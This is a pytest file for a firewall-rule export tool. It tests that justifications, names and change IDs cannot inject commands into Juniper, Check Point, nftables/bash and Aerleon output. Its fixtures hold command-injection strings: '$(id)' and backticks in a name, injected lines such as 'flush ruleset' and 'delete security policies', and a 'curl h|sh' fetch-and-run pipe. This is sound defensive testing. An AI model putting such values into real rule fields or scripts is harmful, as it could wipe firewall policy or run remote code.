"""Free text a rule author typed must come out of an export as text, never as
a statement.

A justification, a name or a change ID ends up as a comment line in a set
file, an nft script or a bash script, and the rule name sat inside double
quotes on a mgmt_cli line. A line break ended the comment and made the rest
the next statement; in double quotes `$(...)` and backticks were live. The
four-eyes review is the only gate, and the second line of a long
justification is where it looks least.
"""
import shlex

import pytest
from pydantic import ValidationError

from app.exporters import aerleon_export, checkpoint, hostfw, juniper
from app.exporters.common import comment_text, shell_word
from app.models import ComponentType, Rule, RuleAction, RuleStatus, SecurityComponent
from app.schemas import RuleCreate

INJECTED = "delete security policies"
NAME = 'web" ; $(id) `id` ; "x'


def rule(**overrides) -> Rule:
    defaults = {
        "id": 1, "rule_id": "SR0900", "name": NAME, "application": "Shop",
        "components": [SecurityComponent(id=1, name="FW", type=ComponentType.juniper)],
        "source_zone": "trust", "destination_zone": "untrust",
        "source": [{"ip": "10.0.1.0/24", "alias": "lan\nflush ruleset"}],
        "destination": [{"ip": "192.168.1.0/24", "alias": ""}],
        "services": [{"protocol": "TCP", "port": "443"}], "action": RuleAction.permit,
        "justification": f"legit\n{INJECTED}\nmore", "change_id": "CHN1\nset system",
        "status": RuleStatus.approved, "impl_status": {},
    }
    defaults.update(overrides)
    return Rule(**defaults)


def statement_lines(text: str) -> list[str]:
    return [ln for ln in text.splitlines() if ln.strip() and not ln.lstrip().startswith("#")]


# ---------- the helpers ----------

def test_comment_text_flattens_every_control_character():
    assert comment_text("a\nb\r\nc\td\x00e") == "a b c d e"
    assert comment_text("x" * 300, 80) == "x" * 80
    assert comment_text(None) == ""


def test_shell_word_is_one_word_for_the_shell():
    assert shlex.split(shell_word(NAME)) == [NAME]
    assert shlex.split(shell_word("a\nb"))[0] == "a b"


# ---------- the exporters ----------

def test_juniper_comments_stay_comments():
    out = juniper.export([rule()])
    assert INJECTED not in statement_lines(out).__str__()
    assert all(ln.startswith("set ") for ln in statement_lines(out))
    assert "set system" not in out.replace("# Change: CHN1 set system", "")


def test_checkpoint_cli_name_is_one_shell_word_and_comments_stay_comments():
    out = checkpoint.export_cli([rule()])
    assert INJECTED not in "\n".join(statement_lines(out))
    add = next(ln for ln in out.splitlines() if ln.startswith("mgmt_cli add access-rule"))
    words = shlex.split(add)
    assert words[words.index("name") + 1] == f"SR0900 {NAME}"
    assert "$(id)" not in add.replace(shell_word(f"SR0900 {NAME}"), "")


@pytest.mark.parametrize("export", [hostfw.export_debian, hostfw.export_redhat, hostfw.export_sles])
def test_host_firewall_comments_stay_comments(export):
    out = export("192.168.1.10", [(rule(justification="x\nadd rule inet filter input accept\ncurl h|sh"), False)])
    assert "add rule inet filter input accept" not in [ln.strip() for ln in statement_lines(out)]
    assert not any(ln.strip().startswith("curl") for ln in out.splitlines())


def test_aerleon_zone_headers_take_one_token_per_zone():
    policy, _ = aerleon_export.build_policy([rule(source_zone="A to-zone untrust", destination_zone="B")], "srx")
    header = policy["filters"][0]["header"]["targets"]["srx"]
    assert "from-zone A-to-zone-untrust to-zone B" in header


def test_aerleon_comments_are_single_line():
    policy, definitions = aerleon_export.build_policy([rule()], "cisco")
    term = policy["filters"][0]["terms"][0]
    assert "\n" not in term["comment"]
    for net in definitions["networks"].values():
        for value in net["values"]:
            assert "\n" not in value.get("comment", "")


# ---------- the input ----------

@pytest.mark.parametrize("field", ["name", "change_id", "requestor", "application", "app_id"])
def test_a_single_line_field_refuses_a_line_break(field):
    payload = {"source": [{"ip": "10.0.0.1"}], "destination": [{"ip": "10.0.0.2"}],
               "services": [{"protocol": "TCP", "port": "443"}], field: "a\nb"}
    with pytest.raises(ValidationError) as exc:
        RuleCreate(**payload)
    assert "control characters" in str(exc.value)


def test_a_field_longer_than_its_column_is_refused():
    payload = {"source": [{"ip": "10.0.0.1"}], "destination": [{"ip": "10.0.0.2"}],
               "services": [{"protocol": "TCP", "port": "443"}], "name": "n" * 129}
    with pytest.raises(ValidationError):
        RuleCreate(**payload)


def test_a_justification_keeps_its_line_breaks():
    """Multi-line by nature; the exporters flatten it, the record keeps it."""
    payload = {"source": [{"ip": "10.0.0.1"}], "destination": [{"ip": "10.0.0.2"}],
               "services": [{"protocol": "TCP", "port": "443"}], "justification": "line 1\nline 2"}
    assert RuleCreate(**payload).justification == "line 1\nline 2"
